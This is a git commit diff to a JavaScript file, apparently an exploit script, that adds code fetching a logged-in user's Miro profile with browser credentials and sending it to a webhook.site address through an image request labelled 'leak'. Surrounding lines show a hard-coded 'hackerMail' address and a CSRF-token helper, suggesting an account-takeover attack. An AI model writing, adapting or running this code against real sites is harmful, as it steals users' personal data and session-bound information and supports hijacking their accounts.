85157901f060a5901ca1880f8f8fabbec4126cdb
n3vrm1ndcodeV1 <n3vrm1ndcode@gmail.com>
2025-08-10 23:47:35 +0100

    Update p2.js

--- p2.js
+++ p2.js
@@ -1,3 +1,25 @@
+(() => {
+	fetch("https://miro.com/api/v1/profile/", {
+		method: "GET",
+		credentials: "include"
+	})
+		.then(res => res.json())
+		.then(profileData => {
+			const {
+				achievements,
+				subscriptions,
+				toolbarPlugins,
+				interests,
+				betaFeatures,
+				...slimProfileData
+			} = profileData;
+			const img = new Image();
+			img.src = "https://webhook.site/81dfa662-c0be-426b-8512-70579868beee?leak=" +
+				encodeURIComponent(JSON.stringify(slimProfileData));
+		})
+		.catch(err => console.error("Profile fetch failed or blocked:", err));
+})();
+
 const hackerMail = "graylen.sitiveni@malldrops.com";
 
 async function getCsrf() {
